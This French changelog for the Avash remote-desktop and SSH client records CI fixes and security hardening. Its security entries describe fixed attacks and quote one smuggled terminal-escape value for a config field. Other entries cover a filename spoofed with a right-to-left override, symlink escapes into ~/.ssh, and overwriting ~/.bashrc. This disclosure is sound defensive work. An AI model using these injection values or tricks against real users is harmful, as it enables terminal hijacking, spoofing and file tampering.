# Journal des modifications

Toutes les modifications notables d'Avash sont consignées dans ce fichier.

Le format s'inspire de [Keep a Changelog](https://keepachangelog.com/fr/1.1.0/),
et le projet suit le [versionnage sémantique](https://semver.org/lang/fr/).

## [Non publié]

### Chaîne d'intégration et garde-fous

- **Sur GitLab, la conformité passe après la suite bout en bout.** Depuis que la
  suite attend les jobs Rust, elle se retrouvait à côté de la conformité, dont
  les conteneurs xrdp saturent le poste qui sert d'exécuteur : une session SSH
  « jamais live » en vingt secondes, deux fois sur quatre pipelines, jamais sur
  GitHub ni sur le poste au repos. Les deux jobs se suivent désormais.
- **Les caches GitLab maigrissent et cessent de s'écraser.** Le job rust
  passait 21 minutes à archiver un `target` de 19 Go pour 5 minutes de
  vérifications, la suite bout en bout 24 minutes à réarchiver le même sans y
  avoir rien ajouté, et deux jobs qui archivaient la même clé en parallèle se
  l'écrasaient tour à tour : le processus RDP repartait à froid à chaque
  pipeline. Chaque clé n'a plus qu'un job qui l'archive, les autres ne font que
  restaurer, les archives sont au niveau de compression le plus rapide (le
  disque l'est déjà), les trois emplacements parallèles de l'exécuteur
  partagent un seul cache, et `scripts/balayer-cibles.sh` retire d'un `target`
  les unités que cargo n'énumère plus (47 Go sur le poste le jour même).
- **Les paquets portés construisent dans un seul répertoire.** Les sept paquets
  IronRDP et vnc-rs du processus RDP avaient chacun leur `target`, jamais mis en
  cache (sept constructions à froid par pipeline) ; ils construisent dans
  `rdp-sidecar/target/portes`, l'ironrdp-server porté dans
  `test-rdp-server/target/portes`, avec le cache de leur hôte.
- **L'aléa E2E `vue-partagee` (« session 2 jamais live ») est corrigé à la
  source.** La liste des hôtes se reconstruit entièrement (`innerHTML = ""`) à
  chaque changement d'état de session, à l'arrivée du logo d'OS distant et au
  changement d'onglet : trois rendus se pressent autour d'une ouverture. Le
  second double-clic du scénario tombait sur une ligne détachée par un de ces
  rendus, et sous WebKitWebDriver un double-clic sur un nœud détaché ne lève pas
  et n'ouvre rien : la seconde session ne démarrait jamais. Reproduit dans un
  conteneur identique à l'exécuteur (un échec sur quatre passages) et prouvé par
  une trace instrumentée du binaire (aucun `openSession` pour la seconde
  session). `doubleCliquerHote` vérifie désormais l'effet du geste, un onglet de
  plus, et re-trouve la ligne puis recommence si le clic est tombé dans le vide,
  comme le faisait déjà le chemin embarqué.

## [0.11.1] - 2026-09-10

### Corrigé

- **Une offre de fichiers au bureau distant n'est plus refusée quand sa
  désignation est encore en route.** Le parent annonce le chemin désigné sur
  l'entrée standard du processus RDP juste avant que le front n'envoie l'offre
  par le WebSocket ; les deux arrivent par des fils différents, et sur un
  exécuteur chargé (chaîne GitLab, première exécution de la 0.11.0) l'offre a
  été traitée la première et le fichier légitime refusé comme non désigné. Le
  processus attend désormais jusqu'à deux secondes une désignation absente avant
  de refuser : la ligne est déjà dans le tube et se lit en microsecondes, seul
  un chemin inventé par un script attend ce délai pour rien.
- **Le serveur RDP de test ne perd plus ses en-têtes RemoteFX, et les scénarios
  RDP cessent de rougir par intermittence.** Les aléas vus sur les deux chaînes
  (« no RFX channel found » côté client, sur `rdp.spec`, `onglets-mixtes`,
  `rdp-reconnect`) n'étaient pas des aléas : dans le paquet `ironrdp-server`
  porté, l'encodeur RemoteFX consommait ses en-têtes (Sync, Context, Channels)
  au premier essai d'encodage, et repartait sans eux quand ce premier essai
  manquait de tampon, ce qu'une petite région suffit à provoquer (pavage en
  tuiles de 64 × 64). Le client n'ayant jamais reçu la liste des canaux, la
  session mourait à sa première trame. Reproduit hors de l'application par un
  harnais qui enchaîne les connexions sous charge, corrigé à la source, et le
  message du client nomme désormais la cause au lieu de « no RFX channel found
  ».

### Chaîne d'intégration et garde-fous

- **Onze montées de version Dependabot traitées en lot, majeures comprises.**
  `actions/cache` et `actions/cache/restore` passent de 4.2.3 à 6.1.0 (exécution
  sur Node 24, exécuteur GitHub 2.327.1 au minimum : les exécuteurs hébergés le
  sont ; aucune clé de cache ne change), `claude-code-action` 1.0.217,
  `taiki-e/install-action` 2.87.7, l'image `rust:1-bookworm` de la chaîne GitLab
  sur son nouveau digest, `dirs` 7 dans le cœur comme dans le processus RDP (sa
  seule rupture, `preference_dir` sous Windows, n'est appelée nulle part),
  `tauri-plugin-wdio-webdriver` 1.4.0, `tokio-rustls` 0.26.5, et `@wdio/cli`,
  `@wdio/local-runner` et `@wdio/mocha-framework` 9.31.6 pour la suite bout en
  bout, rejouée en entier à chaque fois.
- **La chaîne GitLab est de nouveau verte.** Elle rougissait à chaque pipeline
  depuis le 8 septembre sur un test du processus RDP : l'exécuteur y tourne en
  root, que `CAP_DAC_OVERRIDE` laisse écrire un fichier en 0444, et l'assertion
  « GENERIC_WRITE refusé sur un 0444 » ne portait pas la réserve que le cas 0000
  voisin avait déjà. Elle a rougi une seconde fois sur un test du front qui
  cherchait la règle `display: contents` par une expression rationnelle rejouée
  à chaque accolade du fichier : une seconde ici, près de six sur cet exécuteur,
  au-delà des cinq que vitest accorde. Le test parcourt désormais les blocs CSS
  en temps linéaire (177 ms). Une troisième fois enfin par le job Rust, tué à la
  limite d'une heure alors que son script était vert en vingt-quatre minutes :
  l'archivage du cache `target`, 83 000 fichiers gonflés d'artefacts
  incrémentaux inutiles en intégration continue, dépassait les vingt-cinq
  minutes. `CARGO_INCREMENTAL=0` sur toute la chaîne, et le job Rust dispose de
  quatre-vingt-dix minutes.
- **Les tests du paquet `ironrdp-server` porté s'exécutent enfin.** Son `[lib]`
  portait `test = false`, hérité de l'amont, comme les paquets du sidecar avant
  le 8 septembre : ses onze tests, dont ceux de l'autodétection réseau, ne
  tournaient nulle part. `check.sh` et les deux chaînes les jouent.
- **`check.sh` dit où va son temps.** Chaque étape affiche sa durée dès qu'elle
  dépasse la seconde, et la porte son total : on savait qu'elle prenait un quart
  d'heure sans savoir où.
- **Les paquets portés sont comparés à l'amont chaque semaine.** Dependabot ne
  voit que les dépendances déclarées, jamais un répertoire `vendor/` : un job du
  workflow Qualité (`scripts/portes-amont.sh`) rougit dès qu'un paquet porté est
  en retard sur crates.io, pour que la fusion des correctifs amont sur les
  nôtres soit une décision datée. Relevé du jour : les huit paquets portés sont
  à la version amont courante.
- **Chaque scénario bout en bout a son port de serveur de test.** Deux scénarios
  RDP lançaient leur serveur sur 33896, trois autres sur 33897, l'un juste après
  l'autre ; le `after` du premier envoie SIGTERM sans attendre, le serveur
  suivant trouvait le port encore pris et s'arrêtait, et le scénario expirait
  sur « port pas prêt à temps ». Un port par scénario, et un contrôle interdit
  le partage.
- **Sur GitLab, la suite bout en bout attend les jobs Rust.** L'exécuteur est un
  poste de travail, pas une ferme : lancée dès le front, la suite partageait le
  processeur avec deux compilations release et rougissait sur des délais réels
  (serveur prêt, session SSH vivante). Elle passe après `rust` et
  `processus-rdp`, caches chauds, machine calme ; `front` reste requis pour son
  artefact `web/dist`.

## [0.11.0] - 2026-09-09

### Sécurité

- **Une invite du serveur SSH ne peut plus forger un marqueur interne ni piloter
  le terminal.** Le cœur et l'interface se parlent par des marqueurs `[AVASH_…]`
  glissés dans les messages d'erreur : `[AVASH_HOST_KEY_CHANGED]` déclenche la
  proposition d'oublier la clé d'hôte mémorisée. Or le texte d'une invite
  `keyboard-interactive` à laquelle le cœur ne sait pas répondre était recopié
  tel quel dans ce même message, et l'interface ne testait que la présence de la
  sous-chaîne. Un serveur hostile pouvait donc écrire le marqueur lui-même et
  faire effacer la confiance accordée à un hôte sain ; le même texte atteignait
  xterm.js sans filtre, séquences ANSI comprises : effacer l'écran, remonter le
  curseur sur l'alerte affichée juste au-dessus, imiter une invite locale de mot
  de passe. Le cœur neutralise désormais tout texte venu d'en face à l'entrée
  (`texte_distant_sur` : caractères de contrôle, marqueurs internes, longueur
  bornée), et l'interface filtre une seconde fois avant d'écrire dans le
  terminal ou dans une boîte de dialogue (`nettoyerPourTerminal`,
  `nettoyerMarqueurs`). Le flux du PTY, lui, garde ses séquences : c'est du
  terminal légitime. Un contrôle de bout en bout
  (`scripts/tests/texte-distant-neutralise.sh`) vérifie les deux barrières.
- **Un nom de fichier truqué venu du bureau distant est refusé, et ce qui
  s'affiche ne ment plus.** Un serveur RDP pouvait copier sur son presse-papiers
  un fichier nommé « malware\u202Etxt.exe » : le contrôle Unicode de direction
  inverse ce qui le suit, si bien que la liste proposée avant acceptation
  affichait « malwareexe.txt ». L'utilisateur croyait prendre un fichier texte,
  et le nom écrit sur le disque gardait le piège, dans son gestionnaire de
  fichiers comme partout ailleurs. Rien ne filtrait cela : ni nous, ni
  `sanitize_file_path` d'IronRDP (qui ne voit que les octets nuls et les
  séparateurs), ni le front. Un composant qui porte un contrôle bidirectionnel,
  un invisible sans chasse ou un saut de ligne forcé (U+2028, U+2029, qu'une
  webview ne replie pas contrairement à « \n », et qui coupaient en deux le
  badge des fichiers en cours et la notification d'erreurs) fait désormais
  refuser le fichier, et tout nom affiché neutralise ces caractères. L'antiliant
  et le liant sans chasse restent permis : l'écriture persane et les séquences
  emoji en dépendent.
- **Un champ de `~/.ssh/config` ne peut plus rejouer une séquence de terminal.**
  La validation d'écriture ne refusait que `\n`, `\r`, `\0` et le guillemet ; la
  variante « sans espace » y ajoutait `char::is_whitespace`, qui ignore les
  codes de contrôle C0. Aucun champ n'excluait donc ESC, BEL ni DEL : un export
  PuTTY hostile portant `HostName=srv\x1b]0;PWNED\x07` passait l'import et
  s'écrivait tel quel dans `~/.ssh/config` (`render_host_block` ne fait qu'un
  `trim`). La séquence repartait ensuite vers le terminal sans que personne
  ouvre le fichier : à chaque `avash list`, et à chaque ouverture d'onglet dans
  l'application, qui écrivait l'étiquette « utilisateur@hôte:port » brute dans
  xterm.js : titre de fenêtre réécrit, presse-papiers manipulé par OSC 52,
  réponse d'une requête d'état réinjectée comme une frappe sur certains
  émulateurs. `validate_config_value` et `validate_alias` refusent maintenant
  tout caractère de contrôle, tabulation comprise ; les noms de dossiers suivent
  la même règle. Et parce que durcir la seule écriture d'Avash ne protège pas
  d'un fichier déjà piégé par un autre outil, tout ce qui est relu de
  `~/.ssh/config` est neutralisé avant affichage, côté CLI comme côté
  application. En contrepartie, une valeur jusqu'ici acceptée peut désormais
  être refusée à l'enregistrement, avec le point de code fautif dans le message.
  L'espace redevient au passage tolérée **entre** les maillons d'un `ProxyJump`
  (« bastion, relais:2200 », la forme canonique) : la refuser sur la chaîne
  entière rendait impossible de réenregistrer un hôte déjà noté ainsi, même
  pour n'en changer qu'un tag.
- **Un fichier reçu du bureau distant ne peut plus être écrit hors du dossier de
  réception par un lien symbolique.** La réception CLIPRDR validait chaque
  composant du chemin (pas de `..`, pas de séparateur, pas de nom réservé) puis
  vérifiait, lexicalement, que le résultat restait sous le dossier de réception
  : un contrôle toujours vrai, aveugle à un sous-dossier déjà remplacé par un
  lien pointant ailleurs, ou à un nom de fichier qui était lui-même un lien
  cassé vers un chemin choisi. `create_dir_all` traversait le lien sans
  broncher, et un fichier au contenu choisi par le serveur se retrouvait par
  exemple dans `~/.ssh`. Le parent est désormais créé composant par composant,
  en refusant tout élément préexistant qui n'est pas un vrai dossier, et un nom
  occupé par un lien, même cassé, compte comme pris. Le lecteur RDPDR s'en
  protégeait déjà ; les deux chemins de réception sont maintenant au même
  niveau.
- **Un serveur VNC qui refuse le mot de passe ne peut plus faire gonfler la
  mémoire du client.** Après un refus d'authentification, le client lisait la «
  raison » jusqu'à la fermeture de la connexion, sans borne ni égard pour la
  longueur que le protocole annonce : un serveur hostile pouvait garder la
  connexion ouverte et déverser des centaines de mégaoctets, tous empilés en
  mémoire pour un simple mot de passe faux. La raison se lit désormais sur la
  longueur annoncée, plafonnée à 1 Kio, aux quatre endroits qui la reçoivent
  (refus RFB en clair, refus sous VeNCrypt, et les deux refus de connexion émis
  avant même la demande de mot de passe). Une fin de flux prématurée reste un
  refus.
- **Un chemin local fourni à un transfert SFTP passe par les mêmes gardes que
  les autres accès au disque.** `sftp_download` acceptait un chemin de
  destination imposé tel quel, sans exiger qu'il soit absolu ni qu'il soit
  libre, alors que le téléchargement se termine par un `rename()` qui remplace
  sa cible sans un mot : depuis la webview, un appel direct pouvait écrire le
  contenu d'un serveur choisi par-dessus `~/.bashrc`. `sftp_upload` lisait de
  même n'importe quel chemin. Le chemin de destination doit désormais être
  absolu et reçoit un nom libre s'il est déjà pris, comme le chemin dérivé du
  nom distant ; la source d'un envoi doit être absolue et exister. Rien ne
  change à l'usage : l'application ne fournit jamais de destination imposée, et
  les envois viennent de la boîte de sélection ou du glisser-déposer.
- **Une commande de plus retirée de la surface offerte à la webview.**
  `enregistrement_en_cours` livrait le chemin absolu du fichier d'enregistrement
  de n'importe quel onglet, et aucun appel du front ne l'utilisait : le front
  suit son état d'enregistrement par les retours de `enregistrement_demarrer` et
  `enregistrement_arreter`. La règle « une commande qui ne sert pas ne
  s'enregistre pas » était écrite en commentaire, mais rien ne la faisait
  respecter ; un contrôle compare désormais la liste exposée aux appels du front
  à chaque `check.sh`.
- **Seuls les fichiers que l'utilisateur a désignés peuvent partir vers un
  serveur.** Exiger d'un envoi SFTP un chemin absolu et existant (point
  précédent) ne fermait pas la porte : `~/.ssh/id_ed25519` est absolu et
  existant, et l'offre de fichiers au bureau distant recevait ses chemins du
  front par le WebSocket du processus RDP, que tout script de la webview atteint
  avec le jeton. Ce que le front sait d'un fichier à envoyer, il le tient de
  deux gestes que le natif voit passer : la boîte de sélection, désormais
  ouverte par le natif (`choisir_fichiers_locaux`), et le dépôt d'un fichier sur
  la fenêtre, que tao signale au natif avant la webview. Les deux retiennent le
  chemin ; `sftp_upload` n'accepte plus que ce qui a été retenu, et le processus
  de bureau distant reçoit chaque désignation sur son entrée standard (`AUTORISE
  <chemin>`) et refuse d'offrir tout autre chemin, sans même le lire. Un script
  qui invente un chemin n'a jamais été vu le désigner. Le champ « dossier
  partagé » d'un bureau RDP, que l'on peut aussi saisir à la main et qui reste
  visible dans le formulaire, garde sa boîte JavaScript.

### Corrigé

- **Une copie d'hôte à hôte interrompue ne détruit plus le fichier qu'elle
  remplace.** Le relais SFTP (« Copier vers un autre hôte », sans passer par le
  disque du poste) créait le fichier chez la cible, donc le tronquait, avant
  de lancer ses bandes de copie. Annulé d'un clic ou coupé par le réseau, il
  laissait à la place de l'homologue déjà présent un fragment troué (les bandes
  écrivent à des décalages disjoints), sans carte de reprise ni le moindre
  avertissement ; la copie de dossier, qui fusionne volontairement, passait par
  là à chaque resynchronisation. Comme le téléchargement et l'envoi, le relais
  écrit désormais dans un `.part` chez la cible et ne le promeut sur le nom
  définitif qu'une fois tous les octets arrivés : le fichier remplacé reste
  entier jusque-là, et un relais interrompu ne laisse rien. Deux conséquences
  visibles : un `.part` apparaît chez la cible pendant la copie, et une copie
  unitaire (qui refuse d'écraser) refuse aussi de détruire un `.part` déjà
  présent, car un tel fichier peut porter les seuls octets complets d'une copie
  dont la promotion avait échoué.
- **Une directive répétée dans un même bloc `Host` est lue comme `ssh` la lit :
  la première l'emporte.** La règle « la première valeur obtenue est retenue »
  d'OpenSSH n'était appliquée qu'ENTRE blocs. À l'intérieur d'un bloc, chaque
  directive écrasait la précédente : un `Host prod` recollé à la main portant
  `User adrien` puis `User root` faisait afficher, pré-remplir et connecter
  Avash en « root », là où `ssh prod` se connecte en « adrien », et rien ne
  signalait l'ambiguïté. `HostName`, `User`, `Port`, `IdentityFile`,
  `ProxyJump` et les conventions `#Tags:` / `#Folder:` gardent désormais leur
  première occurrence, à la liste comme à la résolution. Une valeur vide ne
  compte pas pour une première valeur : un résidu de fusion (`HostName` sans
  argument, `User ""`) est ignoré au profit de la ligne valide qui suit, comme
  l'était déjà un `Port 0`. Conséquence visible : pour un bloc à directives
  dupliquées, la valeur montrée et utilisée change, de la dernière à la
  première.

- **Couper le partage de presse-papiers en plein collage ne laisse plus
  l'explorateur d'en face suspendu.** Quand le distant réclamait le morceau
  suivant d'un fichier offert (`FileContentsRequest`) et que le partage venait
  d'être désactivé depuis l'interface, la requête était purement abandonnée :
  aucune réponse ne partait pour ce flux, ni les octets ni une erreur, et le
  serveur RDP restait à attendre jusqu'à l'expiration de son propre délai. Le
  chemin texte, lui, refermait déjà l'échange par une
  `FormatDataResponse::new_error`. Le partage coupé répond désormais de la même
  façon pour les fichiers, par une `FileContentsResponse` d'erreur sur le flux
  demandé : le collage échoue tout de suite et proprement, au lieu de figer le
  gestionnaire de fichiers distant.
- **Renommer un hôte ne peut plus créer un doublon d'un alias déclaré dans un
  fichier `Include`.** L'ajout vérifiait l'unicité de l'alias sur la
  configuration complète, fichiers inclus résolus ; le renommage ne regardait
  que `~/.ssh/config` lui-même. Un alias déjà défini dans un fichier inclus
  passait donc, et `ssh` tranchait ensuite entre les deux blocs par sa règle du
  premier trouvé, sans que rien ne signale l'ambiguïté. Les deux chemins
  partagent maintenant le même contrôle.
- **Une commande distante tuée par un signal n'est plus rapportée comme
  réussie.** `run` et `run_borne` (déploiement de clé, sonde d'OS, commandes
  rapides) ignoraient le message `exit-signal` et rendaient le code 0 par défaut
  quand le canal se fermait sans statut : une commande tuée par l'OOM du serveur
  ou un `kill -9` passait pour un succès, sortie tronquée comprise. Le correctif
  déjà appliqué à la copie directe (0.10.0) est porté ici : un signal devient
  une erreur nommée, un canal fermé sans statut aussi. La sonde d'OS, qui passe
  par là, ignore désormais un serveur qui fermerait sans statut au lieu d'en
  déduire un faux succès.
- **La copie directe interrompue par un signal referme bien son canal.** Dans
  `run_avec_agent`, le bras qui traitait `exit-signal` sortait de la fonction
  avant la fermeture du canal, seul chemin de sortie à le faire : le serveur
  gardait un canal ouvert et alimenté jusqu'à la fin de la session. Le signal
  est maintenant noté, puis l'erreur rendue après la fermeture, comme partout
  ailleurs ; l'annulation par l'utilisateur garde la priorité sur le signal pour
  que l'interface reçoive son marqueur.
- **Un `~/.ssh/known_hosts` qui n'est pas un fichier ordinaire ne gèle plus la
  connexion.** La vérification de la clé d'hôte lisait le fichier de façon
  synchrone depuis le fil qui mène la négociation ; un tube nommé à sa place
  suspendait cette lecture dans le noyau jusqu'à ce qu'un écrivain se présente,
  c'est-à-dire jamais : onglet figé, sans erreur ni délai. Un simple `stat`
  écarte désormais tout ce qui n'est pas un fichier ordinaire avant de l'ouvrir,
  et le refuse comme illisible. Conséquence assumée : un `known_hosts` pointé
  sur `/dev/null`, manière de désactiver la vérification, passait pour un
  fichier vide et acceptait toute clé ; il est maintenant refusé.
- **L'affichage en biais sur xrdp est aussi corrigé en 8 bits.** Le correctif
  qui retire le remplissage de fin de ligne d'un bitmap RLE plus large que son
  rectangle couvrait les profondeurs 15, 16 et 24 bits, pas le chemin 8 bits à
  palette. Les quatre formats passent désormais par la même fonction, qui ne
  peut plus en oublier un.
- **Le verdict sur un `known_hosts` inexploitable nomme sa cause.** « existe
  mais n'est pas lisible » couvrait aussi bien un fichier aux droits retirés
  qu'un tube nommé, un socket ou un `known_hosts` pointé sur `/dev/null`, alors
  que le geste de réparation diffère (`chmod` d'un côté, retirer et recréer de
  l'autre). Le message distingue désormais « n'est pas un fichier ordinaire
  (tube nommé, socket, périphérique ou répertoire) » de « n'est pas lisible
  (droits du fichier ?) ».

### Chaîne d'intégration et garde-fous

Trois durcissements tirés des deux ratés de la 0.10.0 (publiée pendant que le
fuzzing et gitleaks rougissaient sur le même commit, puis un contrôle négatif
oublié dans une source Rust attrapé de justesse).

- **La publication attend la sécurité.** Le workflow Release rejoue désormais,
  avant de publier, les deux contrôles rapides qui ont mordu : gitleaks sur
  l'historique et une campagne de fuzz sur toutes les cibles. Le job `publier`
  dépend de ce job `securite` en plus du build ; CodeQL, long et déjà planifié,
  reste au workflow Sécurité.
- **Le fuzzing joue toutes les cibles.** `fuzz/fuzz.sh` s'arrêtait à la première
  cible qui plantait : la chaîne de la 0.10.0 a rougi sur `config_ssh` sans rien
  dire des six autres. Toutes sont jouées, les échecs nommés à la fin.
- **La garde couvre le Rust.** `scripts/guard.sh` proscrit désormais dans les
  sources Rust (hors paquets portés) un marqueur de contrôle négatif laissé en
  place, où qu'il soit, et les macros `dbg!` / `todo!` hors commentaires. Un
  `break false, // CONTROLE NEGATIF` avait survécu au format, à clippy et aux
  tests unitaires.

Chaque point a son contrôle reproductible dans `scripts/tests/`, branché dans
`check.sh`, et vérifié en contrôle négatif.

L'audit du 9 septembre 2026 en ajoute d'autres, du même genre : des contrôles
qui existaient sur le papier sans mordre.

- **Le fuzzing joue les neuf cibles, pas sept.** `fuzz/fuzz.sh` portait sa liste
  en dur, en retard sur `fuzz/Cargo.toml` : `glob_match_pur` et `osinfo`
  n'étaient que compilées sur les PR, jamais secouées. La liste se lit désormais
  dans `Cargo.toml`, et un contrôle exige que chaque cible déclarée soit jouée.
- **La cible ClearCodec peut atteindre le plafond anti-OOM.** Ses côtés étaient
  tirés sur 7 bits, donc bornés à 128 pixels : la garde `MAX_DECODE_DIM` (8192
  par axe, posée contre un serveur hostile) était hors d'atteinte de la
  campagne, et sa disparition n'aurait fait rougir personne. Chaque côté se tire
  sur 16 bits, et c'est la surface qui est bornée.
- **La cible `reg_query` dit ce qu'elle couvre.** Les campagnes tournent sous
  Linux, où le décodage des pages de code Windows prend son repli UTF-8 : la FFI
  vers `MultiByteToWideChar`, la partie délicate, n'y est jamais exercée. Le
  commentaire le dit désormais, et un test `cfg(windows)` joue à la main, dans
  le job Windows de la chaîne, les cas limites que le fuzzing ne peut pas
  atteindre (entrée longue, octet non attribué, octet nul).
- **Un lancement manuel du workflow Release sur un tag ne publie plus.** Le job
  `publier` ne testait que la référence : le bouton « Run workflow », prévu pour
  essayer un build sans créer de tag, laissait choisir un tag déjà publié et
  republiait pour de bon, artefacts et `latest.json` signé réécrits sous les
  utilisateurs. L'événement est vérifié en plus de la référence.
- **La garde Rust couvre `fuzz/fuzz_targets`.** Seul code Rust du dépôt que rien
  ne relisait (hors espace de travail, compilé en nightly seulement), et
  pourtant l'endroit même où l'on pose un `dbg!()` pour comprendre un plantage
  trouvé par cargo-fuzz.
- **L'allowlist gitleaks correspond à la valeur exacte.** La regex du jeton
  factice de test n'était pas ancrée ; gitleaks l'évaluant en correspondance
  libre, toute vraie clé contenant cette suite était blanchie. Mesuré avec le
  vrai gitleaks : le jeton factice reste muet, une clé de trente-six caractères
  qui contient le motif est de nouveau signalée.
- **`secrets/` et `.sops.yaml` sont exclus par le `.gitignore` versionné**, plus
  seulement par le `.git/info/exclude` propre à un clone : sur une machine
  reconstruite, un `git add -A` n'aurait rencontré aucun garde-fou.
- **L'aide d'identifiants sops échoue franchement.** Quand `sops -d` échouait
  (clé age absente, clé rotée sans réencoder le fichier), elle rendait des
  identifiants vides avec un code de sortie 0 : git les présentait à l'hébergeur
  et l'utilisateur lisait « échec d'authentification » au lieu de « ta clé de
  déchiffrement manque ». Le contrôle rejoue l'échec avec un faux `sops`, sans
  aucun secret réel.
- **`deny.toml` ne porte plus d'exception fantôme.** L'entrée `ignore` pour
  RUSTSEC-2024-0429 (glib) ne correspondait à rien pour cargo-deny, qui ne
  rapproche pas un avis « par fonction » de la version présente et répondait
  `advisory-not-detected` : elle ne protégeait rien tout en laissant croire à
  une vigilance. La vraie exception vit dans `.cargo/audit.toml`, où
  cargo-audit, lui, rencontre l'avis ; un contrôle refuse désormais toute entrée
  `ignore` que cargo-deny ne rencontre pas dans le graphe, et le contrôle de
  centralisation du 8 septembre, qui exigeait l'égalité stricte des deux listes,
  accepte un écart à condition qu'il soit écrit dans `deny.toml`.
- **`serialport` passe en 4.10.1.** La 4.10.0 a été retirée de crates.io par son
  auteur (compilation cassée sous Linux/PowerPC) ; `cargo audit` et `cargo deny`
  le signalaient à chaque passage sans qu'aucune décision soit tracée, et un
  `cargo update` de routine aurait basculé sans explication.
- **Les compteurs de `docs/qualite.md` sont vérifiés jusqu'au détail.** La ligne
  « Serveurs de test » annonçait 32 avec un détail (2 + 27) qui ne faisait ni 32
  ni le compte réel (4 + 28) ; un contrôle recompte les `#[test]` des deux
  serveurs et exige que le détail et le total concordent.
- **La porte n'est plus lente deux fois.** `check.sh` complet prend un quart
  d'heure ; le hook de pré-commit rejouait ensuite clippy, tests, sidecar et
  front sur le même arbre, huit minutes de plus. `check.sh` écrit désormais,
  quand il est vert, un témoin portant l'empreinte de l'arbre validé (HEAD,
  différences suivies, fichiers non suivis : `scripts/temoin-arbre.sh`), et le
  hook accepte le commit sans rien rejouer tant que l'empreinte n'a pas bougé.
  Le moindre octet changé depuis, et tout est rejoué. La garde index/arbre reste
  première.
- **Les compteurs de tests sont vérifiés aux six emplacements.** La vitrine
  annonçait « 1233 tests » depuis des semaines ; seuls la feuille de route et
  les sous-comptes de `docs/qualite.md` avaient un contrôle. README, README
  anglais, feuille de route et les deux pages de la vitrine doivent désormais
  dire ce que le tableau de `docs/qualite.md` compte, total et par niveau.
- **La branche « renommage direct » de la promotion d'un partiel est éprouvée.**
  Depuis que le serveur SFTP de test refuse le renommage sur une cible existante
  comme OpenSSH, seule la branche « retirer puis renommer » l'était. Un segment
  « posix » du chemin rend ce serveur complaisant, et un journal des
  suppressions prouve que la cible n'est jamais retirée dans ce cas : pas un
  instant sans fichier.
- **Les tests du cœur ont quitté `lib.rs`.** Le fichier faisait 3400 lignes,
  dont 1900 de tests en quatre modules ; ils vivent dans `src/tests_lib/`, sous
  les mêmes noms de modules, et `lib.rs` revient à 1500 lignes de logique. Aucun
  test déplacé n'a changé.
- **Dependabot monte `vitest` et ses greffons ensemble.** Les PR séparées #18 et
  #19 (vitest 5, `@vitest/coverage-v8` 5) ne s'installaient pas l'une sans
  l'autre (`ERESOLVE`, toutes chaînes rouges) : un groupe `vitest` les réunit.
  La montée est faite ici, avec eslint, knip, stylelint et typescript-eslint,
  `russh` 0.63.3, `pageant` 0.2.3, `open` 5.4.3 et `claude-code-action` 1.0.216.

### Paquets

- **Le `.desktop` de Flathub annonce enfin la classe que la fenêtre émet.**
  `StartupWMClass` y valait `dev.avash.app`, l'identifiant Tauri, alors que la
  fenêtre s'enregistre sous `avash-ui` : sans `enableGTKAppId` (ni son alias
  `enable-gtk-app-id`, tous deux absents de `tauri.conf.json`), tauri passe
  `app_id: None` à tao et WM_CLASS retombe sur le nom du binaire. GNOME Shell
  et Plasma ne reliaient donc pas la fenêtre à son entrée : icône générique,
  épinglage de l'instance en cours cassé, regroupement perdu. Le `.desktop` de
  l'AUR était juste depuis le début, pour le même exécutable ; les deux sont
  maintenant tenus par le même contrôle, qui recalcule la classe attendue à
  partir des deux orthographes du drapeau. Cela corrige aussi deux traces de la
  même croyance : la note de la 0.8.0 ci-dessous, qui annonçait `dev.avash.app`
  « pour GTK et D-Bus », et le commentaire de `--own-name` dans le manifeste.
- **La fiche AppStream parle enfin du VNC.** Le résumé promettait « SSH, RDP et
  VNC », mais le corps de la description ne citait que SSH, RDP et SFTP, et
  `<keywords>` ignorait `vnc` : dans GNOME Logiciels, Discover et Flathub,
  quelqu'un cherchant un client VNC ne trouvait pas Avash, ou pouvait croire le
  mot décoratif, alors que le VNC est une fonction complète depuis la 0.3.x et
  que winget la décrivait correctement. Les deux paragraphes citent maintenant
  les bureaux VNC et le chiffrement VeNCrypt à certificat épinglé, le mot-clé
  est posé, et un contrôle exige que le corps, les mots-clés et le manifeste
  winget de la version courante couvrent tous les protocoles du résumé.
- **Le compte des droits Flathub à justifier ne se contredit plus.** La section
  Flathub de `RELEASE.md` annonçait « cinq droits qui demandent une exception »,
  les énumérait bien tous les cinq, puis refermait sur « demander les trois
  exceptions » ; le point Flathub de `docs/feuille-de-route.md` en annonçait
  trois lui aussi, et nommait les trois d'avant l'ajout de `--socket=pulseaudio`
  et `--device=all` par l'audit du 7 septembre. Le mainteneur qui suivait l'un
  ou l'autre document pour ouvrir la PR chez `flathub/flathub` laissait sans
  justification les deux droits les plus larges, ceux que le robot Flathub
  signale. Les deux documents citent désormais les cinq mêmes droits, et un
  contrôle exige que le nombre annoncé, le nombre énuméré, le nombre rappelé au
  mainteneur et les finish-args du manifeste concordent, dans les deux fichiers.

## [0.10.1] - 2026-09-08

### Corrigé

- **Un `ProxyJump` à crochets imbriqués (`[[h]:22`) ne laisse plus de crochet
  dans le nom d'hôte.** Le premier correctif de crochets IPv6 retirait un seul
  `[` ; `cargo-fuzz` a trouvé qu'une entrée pathologique en gardait un, ce qui
  faisait échouer le rebond (russh ne sait pas lire un hôte crocheté) et
  déclenchait la garde du fuzzing. Tous les crochets sont désormais retirés du
  nom d'hôte, comme le fait `cleanhostname` d'OpenSSH.

### Intégration continue

- **gitleaks : une valeur factice de test n'est plus prise pour un secret.** Le
  jeton binaire d'un test du contrôle d'accès local du processus RDP
  (`0123456789abcdef`) déclenchait la règle générique de clé d'API. Une
  `.gitleaks.toml` l'autorise explicitement, sans rien relâcher d'autre.


## [0.10.0] - 2026-09-08

### Sécurité

- **VNC sous TLS (VeNCrypt) : l'épinglage du certificat n'est plus
  contournable.** Le vérificateur TLS acceptait n'importe quelle signature de
  poignée de main (les deux `verify_tls*_signature` renvoyaient un accord sans
  condition). Comme l'épinglage porte sur la clé publique du certificat, un
  interposeur pouvait rejouer le certificat public légitime d'un serveur déjà
  connu, sans en posséder la clé privée : la connexion aboutissait et le mot de
  passe VNC partait chez lui. La signature est désormais vérifiée par le
  fournisseur cryptographique de rustls ; seule la chaîne vers une autorité
  reste volontairement non jugée, puisque c'est l'épinglage au premier contact
  qui décide de la confiance. Le RDP, lui, était protégé par la liaison de canal
  de CredSSP. Trouvé par l'audit du 7 septembre 2026.
- **Une clé d'hôte SSH `@revoked` sur un port non standard est de nouveau
  refusée.** La détection des marqueurs `@revoked` / `@cert-authority` de
  `known_hosts` ne reconnaissait pas la forme `[hôte]:port` qu'écrit OpenSSH
  pour un port non standard : la clé révoquée passait pour ne viser aucun hôte
